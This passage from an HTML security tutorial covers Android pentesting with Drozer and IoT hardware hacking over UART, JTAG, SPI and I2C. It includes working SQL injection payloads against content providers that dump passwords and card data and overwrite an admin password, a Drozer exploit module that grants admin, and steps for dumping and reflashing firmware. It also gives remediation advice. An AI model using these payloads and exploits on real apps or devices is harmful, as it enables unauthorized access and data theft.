#   Data Directory: /data/user/0/com.example.vulnerableapp
#   APK Path: /data/app/com.example.vulnerableapp-xyz=/base.apk
#   UID: 10123
#   GID: [3003, 1015, 1028]
#   Shared Libraries: null
#   Shared User ID: null
#   Permissions:
#     - android.permission.INTERNET
#     - android.permission.WRITE_EXTERNAL_STORAGE
#     - android.permission.READ_EXTERNAL_STORAGE</div>

            <h4>Identifying Attack Surface</h4>

            <div class="code"># Find exported activities (can be launched by other apps):
dz> run app.activity.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.MainActivity
#     Permission: null                    ‚Üê NO PERMISSION REQUIRED!
#     Exported: True                      ‚Üê ACCESSIBLE BY ANY APP!
#   com.example.vulnerableapp.SecretActivity
#     Permission: null
#     Exported: True                      ‚Üê VULNERABILITY!

# Launch the secret activity:
dz> run app.activity.start --component com.example.vulnerableapp com.example.vulnerableapp.SecretActivity

# The secret activity opens! (Should have been protected)

# Find exported services:
dz> run app.service.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.AdminService
#     Permission: null
#     Exported: True                      ‚Üê ANY APP CAN START THIS!

# Find broadcast receivers:
dz> run app.broadcast.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.SMSReceiver
#     Permission: null
#     Exported: True

# Send a broadcast to trigger it:
dz> run app.broadcast.send --action android.provider.Telephony.SMS_RECEIVED

# Find content providers (database interfaces):
dz> run app.provider.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.UserProvider
#     Authority: com.example.vulnerableapp.users
#     Read Permission: null               ‚Üê NO READ PERMISSION!
#     Write Permission: null              ‚Üê NO WRITE PERMISSION!
#     Exported: True                      ‚Üê ANYONE CAN ACCESS DATABASE!
#     Grant URI Permissions: False</div>

            <h4>Exploiting Content Providers (SQL Injection)</h4>

            <div class="code"># Content providers expose database queries to other apps
# If not properly secured, they're vulnerable to SQL injection!

# List accessible content URIs:
dz> run scanner.provider.finduris -a com.example.vulnerableapp

# Output:
# Scanning com.example.vulnerableapp...
# content://com.example.vulnerableapp.users/
# content://com.example.vulnerableapp.users/user
# content://com.example.vulnerableapp.users/admin

# Query the content provider:
dz> run app.provider.query content://com.example.vulnerableapp.users/user

# Output:
# | _id | username      | password       | email                |
# |-----|---------------|----------------|----------------------|
# | 1   | john_doe      | password123    | john@example.com     |
# | 2   | admin         | admin123       | admin@example.com    |
# | 3   | alice         | mypassword     | alice@example.com    |

# SQL Injection test - try to dump all data:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --selection "1=1"

# If vulnerable, returns all records regardless of intended filter

# Advanced SQL injection - extract database schema:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM sqlite_master WHERE type='table'--"

# Try to read other tables:
dz> run app.provider.query content://com.example.vulnerableapp.users/user --projection "* FROM credit_cards--"

# Output:
# | _id | card_number       | cvv  | expiry   |
# |-----|-------------------|------|----------|
# | 1   | 4532123456789012  | 123  | 12/25    |
# | 2   | 5425233412341234  | 456  | 06/26    |

# DATA BREACH! Credit cards exposed via SQL injection!

# Try to modify data (if provider allows write):
dz> run app.provider.update content://com.example.vulnerableapp.users/user --selection "_id=2" --string username admin --string password hacked123

# Changed admin password!</div>

            <h4>Automated Vulnerability Scanning</h4>

            <div class="code"># Drozer has built-in scanners for common vulnerabilities:

# Scan for all vulnerabilities in a package:
dz> run scanner.misc.traverse -a com.example.vulnerableapp

# Scans for path traversal vulnerabilities

# Scan for native code issues:
dz> run scanner.misc.native -a com.example.vulnerableapp

# Scan for debug flags:
dz> run app.package.debuggable

# Output:
# Package: com.example.vulnerableapp
#   Debuggable: True                      ‚Üê SECURITY ISSUE!

# Scan for backup flags:
dz> run app.package.backup

# Output:
# Package: com.example.vulnerableapp
#   Allows Backup: True                   ‚Üê Data can be extracted via adb backup!

# Scan for shared UID:
dz> run app.package.shareduid

# Scan for SQL injection in all providers:
dz> run scanner.provider.injection -a com.example.vulnerableapp

# Output:
# Scanning com.example.vulnerableapp...
# Injection in Projection:
#   content://com.example.vulnerableapp.users/user
#     Vulnerable to projection-based SQL injection
# 
# Injection in Selection:
#   content://com.example.vulnerableapp.users/user
#     Vulnerable to selection-based SQL injection

# Scan for path traversal in providers:
dz> run scanner.provider.traversal -a com.example.vulnerableapp

# Scan for all exported components:
dz> run scanner.activity.browsable -a com.example.vulnerableapp
dz> run scanner.provider.finduris -a com.example.vulnerableapp</div>

            <h4>Creating a Proof-of-Concept Exploit</h4>

            <div class="code"># Scenario: We found that com.example.vulnerableapp has:
# 1. Exported activity that grants admin privileges
# 2. No permission required
# 
# Let's write a malicious APK to exploit it!

# Create exploit.py (Drozer module):

class Exploit(Module):
    name = "Exploit Vulnerable App"
    description = "Grant admin privileges via exported activity"
    
    def execute(self, arguments):
        # Launch the privileged activity
        intent = android.Intent()
        intent.setComponent(
            "com.example.vulnerableapp",
            "com.example.vulnerableapp.GrantAdminActivity"
        )
        intent.putExtra("username", "attacker")
        intent.putExtra("grant_admin", True)
        
        self.getContext().startActivity(intent)
        self.stdout.write("[+] Admin privileges granted to 'attacker'!\n")

# Save as ~/.drozer/modules/exploit.py

# Run the exploit:
dz> run exploit

# Output:
# [+] Admin privileges granted to 'attacker'!
# 
# Exploitation successful! The attacker now has admin access.</div>

            <div class="info-box">
                <h4>Common Drozer Findings</h4>
                <p><strong>Exported Components Without Permissions:</strong><br>
                ‚Ä¢ Activities that can be launched by malicious apps<br>
                ‚Ä¢ Services that can be started/bound without authorization<br>
                ‚Ä¢ Broadcast receivers that process untrusted intents<br>
                ‚Ä¢ Content providers that expose sensitive data<br><br>
                <strong>SQL Injection in Content Providers:</strong><br>
                ‚Ä¢ Projection-based injection (manipulate SELECT columns)<br>
                ‚Ä¢ Selection-based injection (manipulate WHERE clause)<br>
                ‚Ä¢ Allows reading arbitrary tables, modifying data<br><br>
                <strong>Path Traversal:</strong><br>
                ‚Ä¢ Content providers that accept file paths as input<br>
                ‚Ä¢ Can read files outside app's directory (../../../etc/passwd)<br><br>
                <strong>Debug/Backup Flags:</strong><br>
                ‚Ä¢ android:debuggable="true" in production<br>
                ‚Ä¢ android:allowBackup="true" (data can be extracted)<br><br>
                <strong>Remediation:</strong><br>
                ‚Ä¢ Set android:exported="false" unless component MUST be accessible<br>
                ‚Ä¢ Require custom permissions for sensitive components<br>
                ‚Ä¢ Use parameterized queries (never string concatenation)<br>
                ‚Ä¢ Validate all input (paths, intents, query parameters)<br>
                ‚Ä¢ Disable debugging and backups in production builds</p>
            </div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è iOS Pentesting: A Quick Overview</h4>
                <p>While this chapter focuses on Android, iOS pentesting has similar concepts but different tools:<br><br>
                <strong>iOS App Structure:</strong><br>
                ‚Ä¢ <strong>IPA:</strong> iOS App Store Package (like APK for Android)<br>
                ‚Ä¢ <strong>Mach-O:</strong> iOS executable format (like DEX for Android)<br>
                ‚Ä¢ <strong>Plist:</strong> Property list files (like AndroidManifest.xml)<br><br>
                <strong>Key Tools:</strong><br>
                ‚Ä¢ <strong>class-dump:</strong> Extract Objective-C headers from apps<br>
                ‚Ä¢ <strong>Clutch:</strong> Decrypt App Store encrypted apps (requires jailbreak)<br>
                ‚Ä¢ <strong>Hopper/Ghidra:</strong> Disassemble Mach-O binaries<br>
                ‚Ä¢ <strong>Frida:</strong> Works on iOS too! (requires jailbreak)<br>
                ‚Ä¢ <strong>Cycript:</strong> JavaScript/Objective-C hybrid console for runtime manipulation<br>
                ‚Ä¢ <strong>Burp Suite:</strong> Same HTTPS interception as Android<br><br>
                <strong>Key Differences:</strong><br>
                ‚Ä¢ iOS apps are always encrypted by Apple (need jailbreak to decrypt)<br>
                ‚Ä¢ No easy "decompile to source" (Objective-C/Swift ‚Üí assembly only)<br>
                ‚Ä¢ Sandbox is much stricter (harder to access other apps' data)<br>
                ‚Ä¢ Jailbreaking required for most pentesting tools<br><br>
                <strong>iOS Testing Workflow:</strong><br>
                1. <strong>Jailbreak device:</strong> Use checkra1n, unc0ver, or Odyssey<br>
                2. <strong>Install Frida:</strong> Same process as Android<br>
                3. <strong>Decrypt IPA:</strong> Use Clutch or CrackerXI+<br>
                4. <strong>Static analysis:</strong> class-dump for headers, Hopper for disassembly<br>
                5. <strong>Dynamic analysis:</strong> Frida hooks, Cycript runtime manipulation<br>
                6. <strong>Traffic interception:</strong> Burp Suite + certificate pinning bypass<br><br>
                iOS pentesting is generally harder than Android due to Apple's restrictions, but the core vulnerabilities (hardcoded secrets, insecure crypto, logic flaws) are the same!</p>
            </div>

            <div class="metaphor-box">
                <h4>üéâ You're Now a Mobile Security Expert!</h4>
                <p>You've mastered the complete mobile pentesting toolkit:<br><br>
                ‚úÖ <strong>APKTool:</strong> Decompile, modify, recompile APKs<br>
                ‚úÖ <strong>Jadx:</strong> Decompile to readable Java code<br>
                ‚úÖ <strong>ADB:</strong> Complete control over Android devices<br>
                ‚úÖ <strong>MobSF:</strong> Automated security assessment<br>
                ‚úÖ <strong>Frida:</strong> Runtime manipulation and bypass techniques<br>
                ‚úÖ <strong>Drozer:</strong> Android-specific vulnerability discovery<br><br>
                <strong>Your Mobile Pentesting Workflow:</strong><br>
                1. <strong>Acquisition:</strong> Download APK (from device, store, or APK mirror)<br>
                2. <strong>Static Analysis:</strong> Jadx (read code) + MobSF (auto-scan) + grep (search secrets)<br>
                3. <strong>Dynamic Analysis:</strong> ADB (logs, data) + Frida (hooks) + Burp Suite (traffic)<br>
                4. <strong>Exploitation:</strong> APKTool (modify & recompile) + Drozer (component attacks)<br>
                5. <strong>Reporting:</strong> Document findings with severity, impact, PoC, remediation<br><br>
                <strong>Practice Resources:</strong><br>
                ‚Ä¢ <strong>InsecureBankv2:</strong> Intentionally vulnerable banking app<br>
                ‚Ä¢ <strong>DVIA:</strong> Damn Vulnerable iOS App<br>
                ‚Ä¢ <strong>OWASP MSTG:</strong> Mobile Security Testing Guide<br>
                ‚Ä¢ <strong>HackerOne/Bugcrowd:</strong> Real bug bounties for mobile apps<br><br>
                Mobile security is one of the fastest-growing fields in cybersecurity. With 5+ billion smartphones and countless apps, vulnerabilities are everywhere. Now go find them! üöÄüì±</p>
            </div>
        </section>

        <!-- SECTION 3: IoT & Hardware Hacking -->
        <section id="iot-hardware" class="section">
            <h2 class="section-title">IoT & Hardware Hacking</h2>
            <p class="section-intro">Welcome to the physical layer of hacking‚Äîwhere software meets hardware, where invisible radio waves carry secrets, and where a $5 chip can break a $5,000 smart lock. IoT (Internet of Things) devices are EVERYWHERE: smart thermostats, security cameras, baby monitors, door locks, medical devices, industrial controllers. They're connected to the internet, often poorly secured, and contain vulnerabilities that traditional pentesting misses. In this section, you'll learn to speak the language of hardware: UART, JTAG, SPI, I2C. You'll extract firmware from chips, reverse engineer protocols, and exploit devices that don't even have keyboards. This is where hackers become hardware ninjas!</p>

            <div class="metaphor-box">
                <h4>üí° IoT Hacking = Being a Doctor for Electronics</h4>
                <p>Imagine a smart lock is a patient. As a doctor, you need to:<br><br>
                <strong>‚Ä¢ Examine externally:</strong> Look at the device, find ports, identify chips<br>
                <strong>‚Ä¢ Take X-rays:</strong> Open the device, analyze the circuit board<br>
                <strong>‚Ä¢ Read its DNA:</strong> Extract firmware from memory chips<br>
                <strong>‚Ä¢ Listen to its heartbeat:</strong> Monitor serial communication (UART/SPI/I2C)<br>
                <strong>‚Ä¢ Perform surgery:</strong> Solder wires, connect debugging interfaces<br>
                <strong>‚Ä¢ Test reflexes:</strong> Send commands, observe responses<br><br>
                Hardware hacking requires patience, careful observation, and understanding how electronics communicate. But the rewards are huge‚Äîyou can bypass security that software-only hackers can't touch!</p>
            </div>

            <h3>Understanding Hardware Communication Protocols</h3>

            <p>Before you can hack IoT devices, you need to understand how their internal components communicate. Here are the four most common hardware protocols:</p>

            <h4>UART - Universal Asynchronous Receiver/Transmitter</h4>

            <div class="info-box">
                <h4>What is UART?</h4>
                <p><strong>UART</strong> is the most common serial communication protocol. It's how embedded devices talk to computers and each other.<br><br>
                <strong>Key characteristics:</strong><br>
                ‚Ä¢ <strong>Asynchronous:</strong> No shared clock signal (devices agree on speed beforehand)<br>
                ‚Ä¢ <strong>Two wires:</strong> TX (transmit) and RX (receive) + GND (ground)<br>
                ‚Ä¢ <strong>Common speeds:</strong> 9600, 19200, 38400, 57600, 115200 baud (bits per second)<br>
                ‚Ä¢ <strong>Use case:</strong> Debug consoles, bootloader access, shell access<br><br>
                <strong>Why hackers love UART:</strong><br>
                Many IoT devices have UART ports that give you a root shell! Manufacturers use them for debugging during development, then forget to disable them in production. Finding UART = instant access!</p>
            </div>

            <div class="code"># UART has 3 main pins (sometimes 4):
# 
# TX  (Transmit)  ‚Üí Device sends data OUT
# RX  (Receive)   ‚Üí Device receives data IN
# GND (Ground)    ‚Üí Common ground reference
# VCC (Power)     ‚Üí Sometimes present (usually 3.3V or 5V)
#
# IMPORTANT: Connect TX of device to RX of your adapter!
#           Connect RX of device to TX of your adapter!
#           ALWAYS connect GND to GND!
#
# Visual diagram:
# 
# Your USB-to-UART adapter:       Target Device:
# ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê              ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
# ‚îÇ TX ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚Üí RX       ‚îÇ
# ‚îÇ RX ‚Üê‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ TX       ‚îÇ
# ‚îÇ GND ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ GND      ‚îÇ
# ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò              ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

# Common UART devices you'll use:
# ‚Ä¢ FTDI FT232 (USB to UART, ~$15)
# ‚Ä¢ CP2102 module (~$5)
# ‚Ä¢ PL2303 (~$3)
# ‚Ä¢ Bus Pirate (multi-protocol, ~$35)</div>

            <h4>Finding UART on a Circuit Board</h4>

            <div class="code"># Step 1: Open the device (unscrew, pry carefully)

# Step 2: Look for suspicious pin headers
# UART pins often appear as:
# ‚Ä¢ 4 holes in a row (labeled or unlabeled)
# ‚Ä¢ 4 solder pads
# ‚Ä¢ Test points labeled J1, J2, JP1, etc.
# ‚Ä¢ Sometimes labeled: TX, RX, GND, VCC or UART, Serial, Console

# Step 3: Use a multimeter to identify pins

# Finding GND (Ground):
# Set multimeter to continuity mode (beep symbol)
# Touch black probe to a known ground (USB shield, screw holes, large metal areas)
# Touch red probe to each pin
# The pin that beeps = GND

# Finding VCC (Power):
# Set multimeter to voltage mode (DC V)
# Black probe on GND
# Red probe on each remaining pin
# Pin showing 3.3V or 5.0V = VCC
# (Device must be powered on!)

# Finding TX (Transmit):
# Set multimeter to voltage mode
# Black probe on GND
# Red probe on remaining pins
# Pin that shows fluctuating voltage when device boots = TX
# (TX is constantly sending data during boot)

# Finding RX (Receive):
# Process of elimination: the last pin is RX
# Or: RX usually stays at VCC level (3.3V or 5V) when idle

# Pro tip: If you have an oscilloscope or logic analyzer, 
# connect to suspected TX pin and power on device.
# You'll see data bursts during boot = confirmed TX!</div>

            <h4>Connecting to UART</h4>

            <div class="code"># Using a USB-to-UART adapter (e.g., FTDI FT232):

# 1. Physical connections:
# Device GND  ‚Üí Adapter GND
# Device TX   ‚Üí Adapter RX
# Device RX   ‚Üí Adapter TX
# (Do NOT connect VCC if device has its own power!)

# 2. Plug adapter into your Kali machine

# 3. Find the serial device:
ls /dev/ttyUSB*

# Output:
# /dev/ttyUSB0

# Or:
dmesg | grep tty

# Output:
# [12345.678] usb 1-1: FTDI USB Serial Device converter now attached to ttyUSB0

# 4. Determine baud rate (speed)
# Common baud rates: 9600, 19200, 38400, 57600, 115200
# Try each until you see readable text!

# 5. Connect with screen:
screen /dev/ttyUSB0 115200

# Format: screen <device> <baud_rate>
# 
# If you see garbage text, wrong baud rate! Try another.
# If you see nothing, try pressing Enter or rebooting the device.
# If you see clean boot messages = SUCCESS!

# Alternative tools:

# minicom:
minicom -D /dev/ttyUSB0 -b 115200

# picocom:
picocom -b 115200 /dev/ttyUSB0

# cu:
cu -l /dev/ttyUSB0 -s 115200

# 6. Common UART outputs you'll see:

# Example 1: Bootloader (U-Boot):
# U-Boot 2020.04 (Jan 15 2024 - 12:34:56 +0000)
# CPU: ARM Cortex-A7
# DRAM: 512 MiB
# Hit any key to stop autoboot: 3... 2... 1...
# 
# ‚Üê PRESS ENTER HERE TO INTERRUPT BOOT!
# 
# => 
# ‚Üê You now have bootloader shell!

# Example 2: Linux boot log:
# [    0.000000] Booting Linux on physical CPU 0x0
# [    0.000000] Linux version 4.19.0 (root@buildserver)
# [    1.234567] Freeing unused kernel memory: 1024K
# [    2.345678] systemd[1]: Starting system...
# 
# SmartDevice login: _
# ‚Üê You get a login prompt!

# Example 3: Root shell (jackpot!):
# 
# BusyBox v1.31.1 () built-in shell (ash)
# Enter 'help' for a list of built-in commands.
# 
# / # _
# ‚Üê Root shell without password!</div>

            <div class="warning-box">
                <h4>‚ö†Ô∏è UART Voltage Levels - Don't Fry Your Device!</h4>
                <p><strong>CRITICAL:</strong> IoT devices typically use 3.3V logic. Some USB-to-UART adapters use 5V. Connecting 5V to a 3.3V device = DEAD DEVICE!<br><br>
                <strong>Always check:</strong><br>
                1. Measure VCC pin with multimeter<br>
                2. Configure your adapter for correct voltage (most FTDI adapters have a jumper)<br>
                3. Use a logic level shifter if mixing voltages<br><br>
                <strong>Safe rule:</strong> If VCC reads ~3.3V, your adapter MUST be in 3.3V mode!<br>
                <strong>Modern adapters:</strong> Many auto-detect voltage levels, but ALWAYS verify!</p>
            </div>

            <h4>JTAG - Joint Test Action Group</h4>

            <div class="info-box">
                <h4>What is JTAG?</h4>
                <p><strong>JTAG</strong> is a debugging interface that gives you COMPLETE control over a processor. Originally designed for testing circuit boards, it's now used for programming chips and debugging firmware.<br><br>
                <strong>Key capabilities:</strong><br>
                ‚Ä¢ <strong>Read/write memory:</strong> Dump firmware directly from chip<br>
                ‚Ä¢ <strong>Step through code:</strong> Debug firmware line by line<br>
                ‚Ä¢ <strong>Set breakpoints:</strong> Pause execution at specific addresses<br>
                ‚Ä¢ <strong>Flash firmware:</strong> Write modified firmware to device<br><br>
                <strong>Why hackers love JTAG:</strong><br>
                JTAG bypasses all software security. Password protection? Irrelevant. Encryption? Can dump keys from memory. Locked bootloader? Can read firmware anyway.<br><br>
                <strong>Downside:</strong> Requires physical access, soldering skills, and expensive tools (but worth it!)</p>
            </div>

            <div class="code"># JTAG has 4-5 main pins:
# 
# TDI  (Test Data In)       ‚Üí Data going TO the chip
# TDO  (Test Data Out)      ‚Üí Data coming FROM the chip
# TCK  (Test Clock)         ‚Üí Clock signal
# TMS  (Test Mode Select)   ‚Üí Control signal
# TRST (Test Reset)         ‚Üí Reset signal (optional)
# GND  (Ground)             ‚Üí Common ground
# VCC  (Target Voltage)     ‚Üí Reference voltage (don't connect power!)

# Common JTAG adapters:
# ‚Ä¢ Bus Pirate (~$35, beginner-friendly)
# ‚Ä¢ SEGGER J-Link (~$60 for EDU version)
# ‚Ä¢ FTDI-based JTAG adapters (~$20)
# ‚Ä¢ Black Magic Probe (~$70, pro-level)

# Finding JTAG pins:
# Look for:
# ‚Ä¢ 10-pin, 14-pin, or 20-pin headers (standard JTAG connectors)
# ‚Ä¢ Labeled pads: JTAG, TCK, TMS, TDI, TDO
# ‚Ä¢ ARM processors often have 10-pin or 20-pin JTAG

# Identifying JTAG pins with multimeter:
# 1. Find GND (continuity test to metal chassis)
# 2. Find VCC (measures 3.3V or 1.8V when powered)
# 3. Remaining pins require logic analyzer or trial-and-error

# Or use JTAGulator (~$150):
# Automated tool that finds JTAG pins by testing all combinations!</div>

            <h4>Using OpenOCD with JTAG</h4>

            <div class="code"># OpenOCD (Open On-Chip Debugger) is THE tool for JTAG

# Install on Kali:
sudo apt install openocd

# Example: Connect to ARM Cortex-M3 chip using FTDI adapter

# Step 1: Create config file (openocd.cfg):
interface ftdi
ftdi_vid_pid 0x0403 0x6014
ftdi_layout_init 0x0008 0x000b

transport select jtag

source [find target/stm32f1x.cfg]

# Step 2: Run OpenOCD:
openocd -f openocd.cfg

# Output:
# Open On-Chip Debugger 0.11.0
# Info : FTDI FT232H found
# Info : clock speed 1000 kHz
# Info : JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477
# Info : stm32f1x.cpu: hardware has 6 breakpoints, 4 watchpoints
# Info : starting gdb server for stm32f1x.cpu on 3333
# Info : Listening on port 3333 for gdb connections

# Step 3: Connect with GDB (in another terminal):
arm-none-eabi-gdb

# Inside GDB:
(gdb) target remote localhost:3333
(gdb) monitor reset halt
(gdb) monitor flash write_image erase firmware.bin 0x08000000
(gdb) monitor reset

# You just flashed custom firmware via JTAG!

# Step 4: Dump firmware from chip:
# In OpenOCD telnet session:
telnet localhost 4444

# Inside OpenOCD telnet:
> halt
> dump_image firmware_dump.bin 0x08000000 0x20000

# Dumps 128KB of firmware from address 0x08000000!

# Common OpenOCD commands:
# halt                        ‚Üí Stop CPU
# reset                       ‚Üí Reset CPU
# reset halt                  ‚Üí Reset and stop
# mdw <address>               ‚Üí Read 32-bit word from memory
# mww <address> <value>       ‚Üí Write 32-bit word to memory
# dump_image <file> <addr> <size> ‚Üí Dump memory region
# load_image <file> <addr>    ‚Üí Load file into memory
# reg                         ‚Üí Show all registers
# step                        ‚Üí Execute one instruction</div>

            <h4>SPI - Serial Peripheral Interface</h4>

            <div class="info-box">
                <h4>What is SPI?</h4>
                <p><strong>SPI</strong> is a synchronous serial protocol used for communicating with flash memory chips, sensors, and displays.<br><br>
                <strong>Key characteristics:</strong><br>
                ‚Ä¢ <strong>4 wires:</strong> MOSI, MISO, SCK, CS<br>
                ‚Ä¢ <strong>Synchronous:</strong> Has dedicated clock line<br>
                ‚Ä¢ <strong>Fast:</strong> Much faster than UART or I2C<br>
                ‚Ä¢ <strong>Common use:</strong> Flash memory chips (EEPROM, NOR flash)<br><br>
                <strong>Why hackers love SPI:</strong><br>
                Many IoT devices store firmware on external SPI flash chips. You can desolder the chip, read it with a $10 programmer, extract firmware, modify it, and flash it back. Complete firmware control without JTAG!</p>
            </div>

            <div class="code"># SPI has 4 main pins:
# 
# MOSI (Master Out, Slave In)  ‚Üí Data from your tool to chip
# MISO (Master In, Slave Out)  ‚Üí Data from chip to your tool
# SCK  (Serial Clock)          ‚Üí Clock signal
# CS   (Chip Select)           ‚Üí Enable this specific chip (active low)
# GND  (Ground)                ‚Üí Common ground

# Common SPI flash chips:
# ‚Ä¢ 25LC series (Microchip)
# ‚Ä¢ AT25 series (Atmel)
# ‚Ä¢ MX25L series (Macronix)
# ‚Ä¢ W25Q series (Winbond) ‚Üê Very common!

# Identifying SPI flash chips:
# Look for 8-pin SOIC or WSON packages
# Chip markings: W25Q128FV, MX25L3206E, etc.
# First digits indicate family, last digits indicate size:
#   W25Q64  = 64 Mbit (8 MB)
#   W25Q128 = 128 Mbit (16 MB)

# Reading SPI flash with CH341A programmer (~$5 on AliExpress):

# Step 1: Identify chip pinout (look up datasheet)
# Standard SOIC8 pinout:
#     ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
# CS  ‚îÇ1  8‚îÇ VCC
# DO  ‚îÇ2  7‚îÇ HOLD
# WP  ‚îÇ3  6‚îÇ CLK
# GND ‚îÇ4  5‚îÇ DI
#     ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

# Step 2: Place chip in programmer socket (or use test clip)

# Step 3: Connect programmer to USB

# Step 4: Use flashrom to read:
flashrom -p ch341a_spi -r firmware_dump.bin

# Output:
# flashrom v1.2
# Calibrating delay loop... OK.
# Found Winbond flash chip "W25Q128.V" (16384 kB, SPI) on ch341a_spi.
# Reading flash... done.

# Step 5: Analyze firmware:
binwalk firmware_dump.bin
strings firmware_dump.bin | grep -i password

# Step 6: Modify firmware (e.g., remove password check)
# [Use hex editor or recompile]

# Step 7: Write modified firmware back:
flashrom -p ch341a_spi -w modified_firmware.bin

# Step 8: Resolder chip to board (or reconnect)

# Device now runs your modified firmware!</div>

            <h4>I2C - Inter-Integrated Circuit</h4>

            <div class="info-box">
                <h4>What is I2C?</h4>
                <p><strong>I2C</strong> (pronounced "I-squared-C") is a two-wire communication protocol for connecting sensors, EEPROMs, and peripherals.<br><br>
                <strong>Key characteristics:</strong><br>
                ‚Ä¢ <strong>2 wires:</strong> SDA (data) and SCL (clock)<br>
                ‚Ä¢ <strong>Multi-master:</strong> Multiple devices on same bus<br>
                ‚Ä¢ <strong>Addressing:</strong> Each device has unique 7-bit address<br>
                ‚Ä¢ <strong>Slower:</strong> Typically 100-400 kHz<br><br>
                <strong>Why hackers love I2C:</strong><br>
                I2C is used for configuration EEPROMs that store device settings, MAC addresses, encryption keys. You can read/write these without removing chips!</p>
            </div>

            <div class="code"># I2C has 2 main pins (+ power):
# 
# SDA (Serial Data)    ‚Üí Bidirectional data line
# SCL (Serial Clock)   ‚Üí Clock signal
# GND (Ground)         ‚Üí Common ground
# VCC (Power)          ‚Üí Pull-up voltage (3.3V or 5V)

# Common I2C devices:
# ‚Ä¢ AT24C series EEPROMs (configuration storage)
# ‚Ä¢ DS1307 RTC (real-time clock)
# ‚Ä¢ BME280 (temperature/humidity sensor)
# ‚Ä¢ OLED displays

# Using Bus Pirate to scan I2C bus:

# Connect Bus Pirate:
screen /dev/ttyUSB0 115200

# Enter I2C mode:
HiZ> m
# Select: 4 (I2C)
I2C> W
# Power: ON
I2C> P
# Pull-ups: ON

# Scan for I2C devices:
I2C> (1)
# Macro 1 = I2C bus scanner

# Output:
# Searching I2C address space. Found devices at:
# 0x50 (0xA0 W) (0xA1 R)  ‚Üê EEPROM detected!
# 0x68 (0xD0 W) (0xD1 R)  ‚Üê RTC detected!

# Read from EEPROM at address 0x50:
I2C> [0xA0 0x00 0x00 [0xA1 r:16]

# Format breakdown:
# [ = Start condition
# 0xA0 = Device address (write mode)
# 0x00 0x00 = Memory address to read from
# [ = Repeated start
# 0xA1 = Device address (read mode)
# r:16 = Read 16 bytes
# ] = Stop condition

# Output (hex dump of EEPROM):
# 0x48 0x65 0x6C 0x6C 0x6F 0x20 0x57 0x6F ...
# (ASCII: "Hello World...")

# Write to EEPROM:
I2C> [0xA0 0x00 0x00 0x41 0x42 0x43]
# Writes "ABC" to address 0x0000</div>

            <h3>Bus Pirate - The Universal Hardware Hacking Tool</h3>

            <p><strong>Bus Pirate</strong> is a multi-protocol hardware debugging tool that speaks UART, SPI, I2C, JTAG, 1-Wire, and more. It's like a Swiss Army knife for hardware hacking!</p>

            <div class="code"># Bus Pirate v3.6 (~$35, v4 ~$50)
# Buy from: Seeed Studio, Adafruit, SparkFun

# Connect to Bus Pirate:
screen /dev/ttyUSB0 115200

# Output:
# HiZ>

# Get help:
HiZ> ?

# Main modes:
# 1. UART
# 2. I2C
# 3. SPI
# 4. JTAG
# 5. 1-Wire
# 6. Raw wire (bitbang mode)

# Example: Dump SPI flash with Bus Pirate

# Enter SPI mode:
HiZ> m
# Select: 5 (SPI)
SPI> 3
# Select speed: 3 (1 MHz)
SPI> W
# Power: ON

# Read JEDEC ID from flash chip:
SPI> [0x9F r:3]

# Output:
# 0xEF 0x40 0x18
# ‚Üê Winbond W25Q128 detected!

# Dump first page (256 bytes):
SPI> [0x03 0x00 0x00 0x00 r:256]
# Command 0x03 = Read data
# Address: 0x000000
# Read: 256 bytes

# Bus Pirate pin assignments:
# Pin 1: GND
# Pin 2: +3.3V (output)
# Pin 3: +5V (output)
# Pin 4: ADC (voltage measurement)
# Pin 5-10: Protocol-specific (changes per mode)

# UART mode (pins 5-10):
# Pin 7: TX  (transmit)
# Pin 8: RX  (receive)

# SPI mode (pins 5-10):
# Pin 5: CS  (chip select)
# Pin 6: MISO (data in)
# Pin 7: CLK (clock)
# Pin 8: MOSI (data out)

# I2C mode (pins 5-10):
# Pin 7: SDA (data)
# Pin 8: SCL (clock)

# Measure voltage on a pin:
HiZ> v
# Shows voltage on ADC pin (Pin 4)</div>

            <h3>Arduino & Raspberry Pi as Hacking Tools</h3>

            <h4>Arduino for Hardware Attacks</h4>

